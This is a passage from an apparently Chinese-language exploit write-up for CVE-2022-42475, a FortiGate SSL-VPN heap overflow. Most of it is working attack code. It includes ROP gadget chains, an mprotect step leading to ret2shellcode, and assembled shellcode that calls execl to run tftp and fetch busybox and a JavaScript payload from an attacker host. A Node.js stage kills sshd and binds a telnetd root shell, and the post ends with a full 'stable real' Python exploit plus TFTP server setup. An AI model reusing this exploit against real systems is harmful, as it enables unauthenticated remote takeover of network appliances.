src="/2023/02/09/CVE-2022-42475/static/boxcniOyqoX4kN3oYHpK17GwApf.png"></p><p>所以我们目标是找到类似 push RDX，pop rsp 或 push r11，pop rsp 的 gadget。接着通过 ropgadget 生成所有的 gadget 并输出到文本（你问我为啥不直接查找？卡到爆！！！）</p><p>接着利用命令关联搜索 <code>cat gadget.txt| grep &quot;push rdx&quot;| grep &quot;pop rsp&quot;</code></p><p><img src="/2023/02/09/CVE-2022-42475/static/boxcnTPsrxcyBOGd3IJeKFUVvMd.png"></p><p>发现有一个比较符合的 <code>0x000000000140583a : push rdx ; pop rsp ; add edi, edi ; nop ; ret</code></p><p>接着我们就能将栈迁移到到 rdx 所指的内存处了</p><ol><li>计算 rdx 可控偏移</li></ol><p>那此处计算方式就和上方一致了，通过再次利用 pattern 进行溢出，并计算 rdx 处的偏移，通过计算得到偏移为 2400</p><p><img src="/2023/02/09/CVE-2022-42475/static/boxcn4hNGUQXG3rPlMPHmrIc9Se.png"></p><ol><li>构造 exp</li></ol><p>此时 rdx 内存处可控，正式开始构造 exp，目前的 exp 是基于 busybox 的，不是真正意义上的 exp，但是也是一样的证明了可以任意代码执行。</p><pre><code>gadget1 = 0x000000000140583a #        payload = b&quot;B&quot;*2400        #payload += int_to_bytes(0x46bb37) + b&quot;\x00&quot;*5 # : pop rax ; ret        payload += int_to_bytes(0x60b30e)+ b&quot;\x00&quot;*5 # : pop rax ; pop rcx ; ret        payload += int_to_bytes(0x58) + b&quot;\x00&quot;*7 # sell offset        payload += int_to_bytes(0x2608366) + b&quot;\x00&quot;*4  #junk op, add r13, r8 ; ret        payload += int_to_bytes(0x2608366) + b&quot;\x00&quot;*4  #junk op, add r13, r8 ; ret        payload += int_to_bytes(0x2a0e1c0) + b&quot;\x00&quot;*4 # add rdx, rax ; mov eax, edx ; sub eax, edi ; ret        payload += int_to_bytes(0x257016a) + b&quot;\x00&quot;*4 #push rdx; pop rdi; ret;        payload += int_to_bytes(0x530c9e) + b&quot;\x00&quot;*5# : pop rsi ; ret        payload += b&quot;\x00&quot;*8 # sell offset 0        payload += int_to_bytes(0x509382) + b&quot;\x00&quot;*5# : pop rdx ; ret        payload += b&quot;\x00&quot;*8 # sell offset 0        payload += int_to_bytes(0x5693D5) + b&quot;\x00&quot;*5 # call system        payload += b&quot;/bin/busybox telnetd -l /bin/sh -b 0.0.0.0 -p 22&quot;+b&quot;\x00&quot;*8        raw = payload+b&quot;A&quot;*(2592-len(payload))        raw += int_to_bytes(gadget1)</code></pre><p>简单讲解一下 payload，首先是 pop rax 用处是 存放距离命令字符串的偏移量，这个可以通过调试也能得到。</p><p>这里由于调试时发现会在栈中多出个 1 导致 pop rax；ret 后执行地址 1 出现错误，所以需要找一个 pop rax 后早 pop 某个寄存器让这个 1 出栈，最终找到了 pop rax ; pop rcx ; ret，不会影响其他 gadget。</p><p>接着调试时发现了一些栈不平衡的问题，利用一些 junk gadget 用来补齐栈</p><p>接着 add rdx, rax 得到命令字符串的地址，并存在 rdx 中</p><p>最后构造 system(cmd,0,0);进行任意命令执行，这里注意需要控制的三个寄存器 rdi、rsi、rdx</p><p>查看一下构造 system 前的寄存器和栈空间</p><p><img src="/2023/02/09/CVE-2022-42475/static/boxcnHOcQXZ6bFQlNt1BR523wuf.png"></p><ol><li>多次发送 payload 后会多出一个进程开在 22 端口，通过 telnet 连接上去成功获得 shell</li></ol><p><img src="/2023/02/09/CVE-2022-42475/static/boxcn8zAekllzjKNxyc7nZH4fhh.png"></p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><pre><code>import socketimport sslfrom struct import packdef int_to_bytes(n, minlen=0):    &quot;&quot;&quot; Convert integer to bytearray with optional minimum length.     &quot;&quot;&quot;    if n &gt; 0:        arr = []        while n:            n, rem = n &gt;&gt; 8, n &amp; 0xff            arr.append(rem)        b = bytearray(arr)    elif n == 0:        b = bytearray(b&#39;\x00&#39;)    else:        raise ValueError(&#39;Only non-negative values supported&#39;)    if minlen &gt; 0 and len(b) &lt; minlen: # zero padding needed?        b = (minlen-len(b)) * &#39;\x00&#39; + b    return bpath = &quot;/remote/login&quot;.encode()id = 0while True:    print(&quot;#&quot;+str(id))    #access mem addr 0x164e000 - 0x17a1fff    CL=0x1b00000000    # push rdx ; pop rsp ; add edi, edi ; nop ; ret    gadget1 = 0x000000000140583a    try:        payload = b&quot;B&quot;*2400        #payload += int_to_bytes(0x46bb37) + b&quot;\x00&quot;*5 # : pop rax ; ret        payload += int_to_bytes(0x60b30e)+ b&quot;\x00&quot;*5 # : pop rax ; pop rcx ; ret        payload += int_to_bytes(0x58) + b&quot;\x00&quot;*7 # sell offset        payload += int_to_bytes(0x2608366) + b&quot;\x00&quot;*4  #junk op, add r13, r8 ; ret        payload += int_to_bytes(0x2608366) + b&quot;\x00&quot;*4  #junk op, add r13, r8 ; ret        payload += int_to_bytes(0x2a0e1c0) + b&quot;\x00&quot;*4 # add rdx, rax ; mov eax, edx ; sub eax, edi ; ret        payload += int_to_bytes(0x257016a) + b&quot;\x00&quot;*4 #push rdx; pop rdi; ret;        payload += int_to_bytes(0x530c9e) + b&quot;\x00&quot;*5# : pop rsi ; ret        payload += b&quot;\x00&quot;*8 # sell offset 0        payload += int_to_bytes(0x509382) + b&quot;\x00&quot;*5# : pop rdx ; ret        payload += b&quot;\x00&quot;*8 # sell offset 0        payload += int_to_bytes(0x5693D5) + b&quot;\x00&quot;*5 # call system        payload += b&quot;/bin/busybox telnetd -l /bin/sh -b 0.0.0.0 -p 22&quot;+b&quot;\x00&quot;*8        raw = payload+b&quot;A&quot;*(2592-len(payload))        raw += int_to_bytes(gadget1)        #raw += int_to_bytes(gadget2)        data = b&quot;POST &quot; + path + b&quot; HTTP/1.1\r\nHost: 192.168.109.111\r\nContent-Length: &quot; + str(int(CL)).encode() + b&quot;\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\n&quot;+raw        _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        _socket.connect((&quot;192.168.109.111&quot;, 4443))        _default_context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)        _socket = _default_context.wrap_socket(_socket)        _socket.sendall(data)        sleep(1)        _socket.sendall(b&#39;ls&#39;)        res = _socket.recv(1024)        print(res)                  #res = _socket.recv(1024)        #if b&quot;HTTP/1.1&quot; not in res:        #    print(&quot;Error detected&quot;)        #    print(CL)        #    continue    except Exception as e:        pass    id+=1</code></pre><p>上述 exp 不能再 real 环境下达到效果，主要原因是调用 system 默认会调用/bin/sh -c cmd 来执行命令，但 real 环境里 sysctl 中没有 sh 功能，导致通过 system 函数无法成功命令。</p><p><img src="/2023/02/09/CVE-2022-42475/static/boxcnuJGJelUGJlpXZvo7JXJ2Pb.png"></p><p>测试代码</p><pre><code>#include &lt;stdio.h&gt;int main(int argc, char const *argv[])&#123;        system(argv[1],0,0);        return 0;&#125;</code></pre><h2 id="REAL-EXP"><a href="#REAL-EXP" class="headerlink" title="REAL EXP"></a>REAL EXP</h2><p>由于在 real environment 中 sh 是不存在的，所以我们不能简单使用 system 执行，从而我们将目光转向 exec*家族</p><p><img src="/2023/02/09/CVE-2022-42475/static/boxcn8EyhtCuWy7ahtW3yie6ggc.png"></p><p>可以看到 init 文件中，exec 家族函数还是很全的！！</p><h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><p>这里会遇到个问题，我们命令执行要干什么呢？执行/bin/sh 是无用的 那我们还怎么能拿到 shell 呢？</p><p>这里我的想法是 给他想办法弄一个 busybox ？可以考虑方式 1. 分析/bin/中有什么可以传输文件的程序 2.rop 写一个文件写入的 gadget，并且传输过去文件</p><p>最终我采用方式 1 ，原因是方式 2 传输文件可能会让输入过长 导致 socket 断开 等一系列网络问题</p><h3 id="构造执行-rop"><a href="#构造执行-rop" class="headerlink" title="构造执行 rop"></a>构造执行 rop</h3><p>这里需要知道 exec*家族有两大派系，一种是参数传参，另一种是数组传参</p><pre><code>#include &lt;unistd.h&gt;int execl(const char *path, const char *arg, ...);int execlp(const char *file, const char *arg, ...);int execle(const char *path, const char *arg, ..., char *const envp[]);int execv(const char *path, char *const argv[]);int execvp(const char *file, char *const argv[]);int execve(const char *path, char *const argv[], char *const envp[]);</code></pre><p>通过编写了个 demo 程序熟悉一下调用方式,这里用的是参数传参，原因是我想直接 rop 到寄存器然后执行</p><pre><code>#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;gcc -g test.c -static -o testvoid main()&#123;      execl(&quot;/bin/tftp&quot;,&quot;/bin/tftp&quot;, &quot;192.168.109.128&quot;, &quot;busybox&quot;, &quot;get&quot;, &quot;octet&quot;, &quot;/sbin/busybox&quot;, NULL);&#125;</code></pre><p>查看 ida</p><p><img src="/2023/02/09/CVE-2022-42475/static/boxcnP0m4tw82EOVuFkUWH8bFWv.png"></p><p>通过 ida 也可以再熟悉一下 x64 的调用顺序</p><pre><code>rdi rsi rdx rcx r8 r9 stack stack+8 .....</code></pre><p>那我们需要写一个 rop chain，至少需要以下 gadget</p><pre><code>获取rsp地址 并且能计算rsp偏移例如 mov reg, rsp;ret, add reg ,offet; ret 或者 push rps; ret pop reg; ret , add reg, offet; ret将栈中地址传递到寄存器中至少需要 pop rdi；pop rsi；pop rdx；pop rcx; pop r8;pop r9call exec* 这个程序中都有</code></pre><p>当能构造出这些参数时会遇到问题，栈中字符串问题：</p><p>当字符串 byte&gt;8 时，直接放在栈中会导致占空间额外多出一个部分</p><p>例如我 rop 中放入字符串 <code>192.168.109.128</code> 则栈中 rsp 部分确实是 该字符串，但 rsp+8 的位置却变成了 109.128</p><p>这个问题会导致我们构造参数时会多出不可控的字符串。导致如果考虑 char 列表来调用的话 rop chain 会修改的非常麻烦！！！非常非常麻烦！</p><p>从而目光转向寄存器传参的方式，该方式也存在问题</p><ol><li>寄存器传参 rop 时 越向后构造越会出现没有好用的 gadget 的情况，因为你不能破坏前面几个参数</li><li>rop 时字符串地址会和上一种方式相同 会出现字符串地址连续的情况，但该情况可以通过多次 rop 将字符串分割，并且多次计算 rsp 地址得到</li></ol><p>此时 我的想法是 如何能得到非常够用的 gadget 呢？最好的情况就是能执行 shellcode 因为这样就可以满足条件一以及轻松的满足条件二</p><h3 id="ROP2mprotect"><a href="#ROP2mprotect" class="headerlink" title="ROP2mprotect"></a>ROP2mprotect</h3><p>熟悉的 ctf 技巧，想办法将 rop 转化为 ret2shelllcode，尝试在 init 中搜索 mprotect 函数，可以看到存在，并且存在两处调用，这非常有用，这样我们就可以在 rop 是直接到这两处地址的位置调用 call _mprotect 了</p><p><img src="/2023/02/09/CVE-2022-42475/static/boxcnxeKK9gfPb8ZyH2P6Ic0j6g.png"></p><p>但要注意我们还是需要 rop 构造 mprotect 参数，首先 为了后续更好的继续执行 shellcode，我们需要确定当前输入的栈空间地址，由于我们是 rop，最好不要出现固定地址，防止不同环境下可能无法通用的情况，所以我们要么选择 leak，要么选择 rop 中通过 push rsp，pop reg 的方式获得当前栈地址，同时理由 add reg，offse 的方式来控制地址具体的位置</p><p><img src="/2023/02/09/CVE-2022-42475/static/boxcn7mlI5ATg53GoRYbzXuWE3c.png"></p><p>在溢出点位置 查看 proc map，这里首先要考虑的能读写的位置，接着最好是现有可控的空间</p><p>此时，可控的空间是 RDX 所指向的内存地址，他所属的内存段为 0x7f6de0b2a000，我们需要将此内存空间赋予执行权限，并 rop ret 到该地址 从而达到 ret2shellcode 的步骤</p><p><img src="/2023/02/09/CVE-2022-42475/static/boxcnWH7y3iM7wCNrxkK6vb9zmd.png"></p><p>所以这段 rop 就可以构造了</p><pre><code>payload = b&quot;B&quot;*2400        payload += int_to_bytes(0x60b30e)+ b&quot;\x00&quot;*5 # : pop rax ; pop rcx ; ret        payload += int_to_bytes(0xfffffffffffa9688) # offset        payload += int_to_bytes(0x2608366) + b&quot;\x00&quot;*4  #junk op, add r13, r8 ; ret        payload += int_to_bytes(0x2608366) + b&quot;\x00&quot;*4  #junk op, add r13, r8 ; ret        payload += int_to_bytes(0x2a0e1c0) + b&quot;\x00&quot;*4 # add rdx, rax ; mov eax, edx ; sub eax, edi ; ret        payload += int_to_bytes(0x257016a) + b&quot;\x00&quot;*4 # #push rdx; pop rdi; ret;        payload += int_to_bytes(0x530c9e) + b&quot;\x00&quot;*5 # : pop rsi ; ret        payload += int_to_bytes(0x258000) + b&quot;\x00&quot;*5        payload += int_to_bytes(0x509382) + b&quot;\x00&quot;*5 # : pop rdx ; ret        payload += int_to_bytes(0x7) + b&quot;\x00&quot;*7               payload += int_to_bytes(0x1537F26) + b&quot;\x00&quot;*4 # jmp _mprotect</code></pre><p>简单说明一下这段 gadget</p><p>pop rax 用来存放偏移地址，用来微调 rsp 的</p><p>Pop rcx 是由于栈空间多出了个 1，无用数据需要出栈</p><p>接着是 offset，用于计算 proc map base address 的，就是当前栈的 rsp 与当前内存段其实地址的偏移，由于下面用到的 add gadget 所以这里要用负数</p><p>Junk op 不做实际操作</p><p>Add rdx， rax 计算 rsp 的偏移 准备给他执行权限</p><p>Pop rdi 作为 mprotect 的第一个参数 ：地址</p><p>Pop rsi 作为 mprotect 的第二个参数： 赋予多大的空间 len</p><p>Pop rdx 作为 mprotect 的第三个参数：赋予的权限 7 = r w x</p><p>接着 调用现有的 gadget，jmp mprotect 执行赋予权限</p><p><img src="/2023/02/09/CVE-2022-42475/static/boxcnUtUuYJTvlmM2MIJTS3qsbd.png"></p><p>rop 后查看当前内存，发现多出了一段可执行内存。</p><h3 id="Ret2shellcode"><a href="#Ret2shellcode" class="headerlink" title="Ret2shellcode"></a>Ret2shellcode</h3><p>我们成功得到了可执行的内存空间，那接下来 只需要 ret 到这里就可以了，具体 ret 到哪里需要我们通过向后填充 shellcode，并在调试时计算出 offset 之后再跳转过去，而不是直接跳转，所以这里我们执行完后还需要再构造一段计算 offset 的 rop chain</p><pre><code>payload += int_to_bytes(0x46bb37) + b&quot;\x00&quot;*5 # pop rax ; retpayload += int_to_bytes(0x56a40) + b&quot;\x00&quot;*5 # offset to stackpayload += int_to_bytes(0x7d4f4d) + b&quot;\x00&quot;*5 # add rax, rdi ; retpayload += int_to_bytes(0x43dccc) + b&quot;\x00&quot;*5 # push rax ; ret</code></pre><p>同样利用 rax 存 offset 微调 rsp</p><p>rdi 是 当时计算后的 base mem 地址</p><p>最后把计算出的 shellcode 地址 压栈 ret</p><p>参考下图 ，rax 存的是 shellcode 的地址，并且已经将该地址压栈执行</p><p><img src="/2023/02/09/CVE-2022-42475/static/boxcnWbt9iKgRGWnks9SXk4ziyh.png"></p><h3 id="Shellcode-构造"><a href="#Shellcode-构造" class="headerlink" title="Shellcode 构造"></a>Shellcode 构造</h3><p>此时我们解决的 gadget 不足的问题，可以随心所欲的编写调用了，为了更好的控制参数，我们选用 寄存器的方式传参，这里还要注意 我们不能直接在 shellcode 中调用 exec <em>家族，当然你可以 syscall，但是这里我选择 ret2shellcode 中只负责构造参数部分，具体执行 exec</em> 的事情交给接下来的工作。</p><pre><code>from pwn import *context(log_level=&#39;debug&#39;, arch=&#39;amd64&#39;, os=&#39;linux&#39;)def bytes2stack_bytes(bytes):    stack_str = &quot;0x&quot;    swap_data = bytearray(bytes)    swap_data.reverse()    for i in swap_data:        t = hex(i)[2:]        stack_str+=t        return stack_strdef gen_shellcode_download_file():    save_path = bytes2stack_bytes(b&quot;/sbin/bu&quot;)    arg2 = bytes2stack_bytes(b&quot;octet&quot;)    arg1 = bytes2stack_bytes(b&quot;get&quot;)    filename = bytes2stack_bytes(b&quot;1.js&quot;)    ip_addr2 = bytes2stack_bytes(b&quot;109.128&quot;)    ip_addr1 = bytes2stack_bytes(b&quot;192.168.&quot;)        cmd_path2 = bytes2stack_bytes(b&quot;p&quot;)    cmd_path1 = bytes2stack_bytes(b&quot;/bin/tft&quot;)    shellcode = asm(&#39;&#39;&#39;      sub rsp,0x1000      push 0      mov rbx, &#123;&#125;      push rbx      mov r9, rsp      mov rbx, &#123;&#125;      push rbx      mov r8, rsp      mov rbx, &#123;&#125;      push rbx      mov rcx,rsp      mov rbx, &#123;&#125;      push rbx      mov rbx, &#123;&#125;      push rbx      mov rdx,rsp      mov rbx,&#123;&#125;      push rbx      mov rbx,&#123;&#125;      push rbx      mov rsi,rsp      mov rdi,rsp      push 0      mov rbx,&#123;&#125;      push rbx      mov r10, rsp      add rax, 0x90      mov rsp, rax      push r10      sub rsp, 0x8      nop      ret&#39;&#39;&#39;.format(arg2,arg1,filename,ip_addr2,ip_addr1,cmd_path2,cmd_path1,save_path))    print(shellcode)    print(len(shellcode))def gen_shellcode_execl():    # execl(&quot;/bin/node&quot;,&quot;/bin/node&quot;,&quot;/sbin/bu&quot;)    js_path = bytes2stack_bytes(b&quot;/sbin/bu&quot;)    bin_path2 = bytes2stack_bytes(b&quot;e&quot;)    bin_path1 = bytes2stack_bytes(b&quot;/bin/nod&quot;)    shellcode = asm(&#39;&#39;&#39;      sub rsp,0x1000      mov rcx, 0      mov rbx, &#123;&#125;      push rbx      mov rdx,rsp      mov rbx,&#123;&#125;      push rbx      mov rbx,&#123;&#125;      push rbx      mov rsi,rsp      mov rdi,rsp      add rax, 0x40      mov rsp, rax      nop      nop      nop      ret&#39;&#39;&#39;.format(js_path, bin_path2, bin_path1))    print(shellcode)    print(len(shellcode))gen_shellcode_execl()</code></pre><p>简单说明一下两段 shellcode，都是在将字符串压栈，然后计算当前的 rsp 地址，并且保存地址到栈的其他位置。由于栈空间的机制，我们字符串压栈最大长度是 8，所以当处理大于 8 的字符串时我们需要分割一下并且从后向前压栈</p><p>注意我的 shellcode 开头，将栈又做了个迁移，这个原因是此时 ret2shellcode 的地址与栈地址重叠 如果不这么做，会导致你压栈的数据破坏掉了原有的 shellcode，导致无法继续执行，所以需要再开辟一段新的占空间，这里选择还是 ssl 结构体中的位置，因为此时数据均为 00000。</p><p>之后就正常构造参数，并要确定参数位置均正确，但不要忘记！！！我们 shellcode 最终位置需要执行 ret，但是 ret 去哪里呢？我们还需要计算一下接下来的 rop 所存内存地址与当前可控地址的偏移，并且这段计算需要提前放在 shellcode 中。</p><p>这里还有个坑点!!!!</p><p>就是最上述中说的，寄存器参数并不够，还有两个参数需要在栈中，注意是这指向这两个参数的地址在栈中，！！！不是字符串！！！ 其他寄存器参数也同样是参数的地址 而不是字符串！！！！</p><p>以及这两个字符串地址并不是压在 shellcode 所在的栈中，而是需要在计算出 rop 处地址后的下一个地址，原因在 ret 后栈空间会跑到 rop 所处地址，此时栈的 rsp 是 rop gadget+8 的位置，那在 shellcode 中则需要先计算出 gadget+8 的地址并且压入栈中后在 ret 过去</p><p>push 前：</p><p><img src="/2023/02/09/CVE-2022-42475/static/boxcnUEY5SpeGZqD7ZGtx0SaRcg.png"></p><p>push 后，可以看到 push 是将字符串压栈进了 c8 的位置，而不是 d0，这里是需要注意的</p><p><img src="/2023/02/09/CVE-2022-42475/static/boxcn22rswcryeUmWF8bVCknsod.png"></p><p>ret 前的堆栈 + 寄存器信息，可以看到满足调用布局</p><p><img src="/2023/02/09/CVE-2022-42475/static/boxcndCjP87RZaZKYX77x4nGJ6g.png"></p><p>最终成功下载到文件（左侧是最终执行 execv 前的栈空间信息，右侧是成功下载文件的实例）</p><p><img src="/2023/02/09/CVE-2022-42475/static/boxcnvSYnaWmZLkzG8nK9Bba6Ug.png"></p><p>接着通过 node 文件去构造文件下载及后续 getshell 的方法</p><h3 id="Nodejs-shellcode"><a href="#Nodejs-shellcode" class="headerlink" title="Nodejs shellcode"></a>Nodejs shellcode</h3><p>当下载下来发现，原来通过 tftp 下载下来的文件 只有读写权限！！并没有执行权限！！！那我们并不能直接 busybox 或者其他 backdoor 程序，因为不能执行。</p><p>当然此处的标题就是解决方法了，在搜索时发现飞塔居然内置了个 nodejs！通过测试发现 nodejs xx.js 是可执行的，并且 nodejs 也存在修改文件权限的函数，那此时思路就更清晰了</p><ol><li>通过之前的命令执行下载 shell.js</li><li>shell.js 中至少要包含以下功能</li><li>一：下载 busybox （比之前的操作简单多了！）</li><li>二：给 busybox 执行权限</li><li>三：弄一个 busybox 的 shell 软链</li><li>四：调用 busybox 中内置的命令 起 shell</li></ol><p>最终成功构造出以下 shellcode</p><pre><code>var fs = require(&#39;fs&#39;);const https = require(&#39;https&#39;)const &#123; execFile, execFileSync &#125; = require(&#39;child_process&#39;);function exp() &#123;         const file2 = &#39;/bin/ash&#39;;        fs.access(file2, fs.constants.F_OK, (err) =&gt; &#123;          if (err) &#123;                  try&#123;                    const res = fs.symlinkSync(&#39;/sbin/busybox&#39;,&#39;/bin/ash&#39;);                    console.log(&#39;ash create success&#39;);                                    &#125;catch(ex)&#123;                    console.log(&#39;ash create error&#39; + ex);                &#125;          &#125;else &#123;                  console.log(&#39;ash already created&#39;);          &#125;        &#125;);        const stdout1 = execFileSync(&#39;/bin/killall&#39;, [&#39;sshd&#39;]);        const stdout2 = execFileSync(&#39;/sbin/busybox&#39;, [&#39;telnetd&#39;, &#39;-l&#39;, &#39;/bin/ash&#39;, &#39;-b&#39;, &#39;0.0.0.0&#39;, &#39;-p&#39;,&#39;22&#39;]);        console.log(stdout1);        console.log(stdout2);        console.log(&#39;shell process create success&#39;);&#125;const file1 = &#39;/sbin/busybox&#39;;fs.access(file1, fs.constants.F_OK, (err) =&gt; &#123;  if (err) &#123;          try&#123;            execFile(&#39;/bin/tftp&#39;, [&#39;192.168.109.128&#39;,&#39;busybox&#39;,&#39;get&#39;, &#39;octet&#39;, &#39;/sbin/busybox&#39;], (err, stdout, stderr) =&gt; &#123;            if(err) &#123;                console.log(err);                return;            &#125;            console.log(&#39;download success&#39;);            fs.chmodSync(&#39;/sbin/busybox&#39;, 777);            console.log(&#39;chmod success&#39;);            exp();        &#125;);                            &#125;catch(ex)&#123;            console.log(&#39;ash create error&#39; + ex);        &#125;  &#125;else &#123;          console.log(&#39;busybox already download&#39;);          exp();            &#125;&#125;);</code></pre><p>最终 再次利用命令执行执行 nodejs 1.js 成功完成利用</p><p>什么？你突然产生疑问？tftp 服务器怎么搭建呢？？</p><h3 id="TFTP-服务器搭建"><a href="#TFTP-服务器搭建" class="headerlink" title="TFTP 服务器搭建"></a>TFTP 服务器搭建</h3><pre><code>sudo apt-get install xinetdsudo apt-get install tftp tftpdsudo vim /etc/xinetd.d/tftp</code></pre><p>修改配置文件，主要改目录</p><pre><code>service tftp&#123;        socket_type             = dgram        protocol                = udp        wait                    = yes        user                    = root        server                  = /usr/sbin/in.tftpd    //服务程序路径        server_args             = -s /home/ios/tftpboot/    //可以访问的tftpd服务器下的目录        disable                 = no            //是否开机启动        per_source              = 11        cps                     = 100 2        flags                   = IPv4&#125;</code></pre><p>新建目录</p><pre><code>mkdir /home/ios/tftpboot/接着把需要用到的两个文件复制进去cp busybox /home/ios/tftpboot/cp 1.js /home/ios/tftpboot/</code></pre><p>搞定</p><h3 id="最终稳定的-Real-EXP！！！"><a href="#最终稳定的-Real-EXP！！！" class="headerlink" title="最终稳定的 Real EXP！！！"></a>最终稳定的 Real EXP！！！</h3><pre><code>import socketimport timeimport sslfrom struct import packdef int_to_bytes(n, minlen=0):    &quot;&quot;&quot; Convert integer to bytearray with optional minimum length.     &quot;&quot;&quot;    if n &gt; 0:        arr = []        while n:            n, rem = n &gt;&gt; 8, n &amp; 0xff            arr.append(rem)        b = bytearray(arr)    elif n == 0:        b = bytearray(b&#39;\x00&#39;)    else:        raise ValueError(&#39;Only non-negative values supported&#39;)    if minlen &gt; 0 and len(b) &lt; minlen: # zero padding needed?        b = (minlen-len(b)) * &#39;\x00&#39; + b    return bdef setp1():    print(&quot;current step: download 1.js&quot;)    path = &quot;/remote/login&quot;.encode()    CL=0x1b00000000    # push rdx ; pop rsp ; add edi, edi ; nop ; ret    gadget1 = 0x000000000140583a    try:        payload = b&quot;B&quot;*2400        payload += int_to_bytes(0x60b30e)+ b&quot;\x00&quot;*5 # : pop rax ; pop rcx ; ret        payload += int_to_bytes(0xfffffffffffa9688) # offset        payload += int_to_bytes(0x2608366) + b&quot;\x00&quot;*4  #junk op, add r13, r8 ; ret        payload += int_to_bytes(0x2608366) + b&quot;\x00&quot;*4  #junk op, add r13, r8 ; ret        payload += int_to_bytes(0x2a0e1c0) + b&quot;\x00&quot;*4 # add rdx, rax ; mov eax, edx ; sub eax, edi ; ret        payload += int_to_bytes(0x257016a) + b&quot;\x00&quot;*4 # #push rdx; pop rdi; ret;        payload += int_to_bytes(0x530c9e) + b&quot;\x00&quot;*5 # : pop rsi ; ret        payload += int_to_bytes(0x258000) + b&quot;\x00&quot;*5        payload += int_to_bytes(0x509382) + b&quot;\x00&quot;*5 # : pop rdx ; ret        payload += int_to_bytes(0x7) + b&quot;\x00&quot;*7               payload += int_to_bytes(0x1537F26) + b&quot;\x00&quot;*4 # jmp _mprotect        payload += int_to_bytes(0x46bb37) + b&quot;\x00&quot;*5 # pop rax ; ret        payload += int_to_bytes(0x56a40) + b&quot;\x00&quot;*5 # offset to stack        payload += int_to_bytes(0x7d4f4d) + b&quot;\x00&quot;*5 # add rax, rdi ; ret        payload += int_to_bytes(0x43dccc) + b&quot;\x00&quot;*5 # push rax ; ret                print(len(payload))        raw = payload+b&quot;A&quot;*(2592-len(payload))        raw += int_to_bytes(gadget1) +b&quot;\x00&quot;*4                raw += b&#39;H\x81\xec\x00\x10\x00\x00j\x00H\xbboctet\x00\x00\x00SI\x89\xe1H\xc7\xc3get\x00SI\x89\xe0H\xc7\xc31.jsSH\x89\xe1H\xbb109.128\x00SH\xbb192.168.SH\x89\xe2H\xc7\xc3p\x00\x00\x00SH\xbb/bin/tftSH\x89\xe6H\x89\xe7j\x00H\xbb/sbin/buSI\x89\xe2H\x05\x90\x00\x00\x00H\x89\xc4ARH\x83\xec\x08\x90\xc3&#39;        raw += int_to_bytes(0x161DB33) +b&quot;\x00&quot;*4 # call execl                        data = b&quot;POST &quot; + path + b&quot; HTTP/1.1\r\nHost: 192.168.109.111\r\nContent-Length: &quot; + str(int(CL)).encode() + b&quot;\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\n&quot;+raw        _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        _socket.connect((&quot;192.168.109.111&quot;, 4443))        _default_context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)        _socket = _default_context.wrap_socket(_socket)        _socket.sendall(data)    except Exception as e:        print(e)def setp2():    print(&quot;current step: execute 1.js&quot;)    path = &quot;/remote/login&quot;.encode()    CL=0x1b00000000    # push rdx ; pop rsp ; add edi, edi ; nop ; ret    gadget1 = 0x000000000140583a    try:        payload = b&quot;B&quot;*2400        payload += int_to_bytes(0x60b30e)+ b&quot;\x00&quot;*5 # : pop rax ; pop rcx ; ret        payload += int_to_bytes(0xfffffffffffa9688) # offset        payload += int_to_bytes(0x2608366) + b&quot;\x00&quot;*4  #junk op, add r13, r8 ; ret        payload += int_to_bytes(0x2608366) + b&quot;\x00&quot;*4  #junk op, add r13, r8 ; ret        payload += int_to_bytes(0x2a0e1c0) + b&quot;\x00&quot;*4 # add rdx, rax ; mov eax, edx ; sub eax, edi ; ret        payload += int_to_bytes(0x257016a) + b&quot;\x00&quot;*4 # #push rdx; pop rdi; ret;        payload += int_to_bytes(0x530c9e) + b&quot;\x00&quot;*5 # : pop rsi ; ret        payload += int_to_bytes(0x258000) + b&quot;\x00&quot;*5        payload += int_to_bytes(0x509382) + b&quot;\x00&quot;*5 # : pop rdx ; ret        payload += int_to_bytes(0x7) + b&quot;\x00&quot;*7               payload += int_to_bytes(0x1537F26) + b&quot;\x00&quot;*4 # jmp _mprotect        payload += int_to_bytes(0x46bb37) + b&quot;\x00&quot;*5 # pop rax ; ret        payload += int_to_bytes(0x56a40) + b&quot;\x00&quot;*5 # offset to stack        payload += int_to_bytes(0x7d4f4d) + b&quot;\x00&quot;*5 # add rax, rdi ; ret        payload += int_to_bytes(0x43dccc) + b&quot;\x00&quot;*5 # push rax ; ret                print(len(payload))        raw = payload+b&quot;A&quot;*(2592-len(payload))        raw += int_to_bytes(gadget1) +b&quot;\x00&quot;*4        # ret2shellcode        raw += b&#39;H\x81\xec\x00\x10\x00\x00H\xc7\xc1\x00\x00\x00\x00H\xbb/sbin/buSH\x89\xe2H\xc7\xc3e\x00\x00\x00SH\xbb/bin/nodSH\x89\xe6H\x89\xe7H\x83\xc0@H\x89\xc4\x90\x90\x90\xc3&#39;        # rop to execl        raw += int_to_bytes(0x161DB33) +b&quot;\x00&quot;*4 # call execl                        data = b&quot;POST &quot; + path + b&quot; HTTP/1.1\r\nHost: 192.168.109.111\r\nContent-Length: &quot; + str(int(CL)).encode() + b&quot;\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\n&quot;+raw        _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        _socket.connect((&quot;192.168.109.111&quot;, 4443))        _default_context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)        _socket = _default_context.wrap_socket(_socket)        _socket.sendall(data)    except Exception as e:        print(e)def main():    #step1 = b&quot;tftp 192.168.109.128 1.js get octet /sbin/bu&quot;    for i in range(10):        time.sleep(0.1)        setp1()    #step2 = b&quot;/bin/node /sbin/bu&quot;    time.sleep(10) #wait for sslvpn reboot    for i in range(10):        time.sleep(0.1)        setp2()main()</code></pre><h3 id="可能存在的问题"><a href="#可能存在的问题" class="headerlink" title="可能存在的问题"></a>可能存在的问题</h3><ol><li>发送 exp 失败，需要低版本的 python+ 低版本的 linux 环境，这里用的是 python2</li><li>exp 没生效？ 可以考虑打完 step1 后等待一段时间 5-10s 后再执行 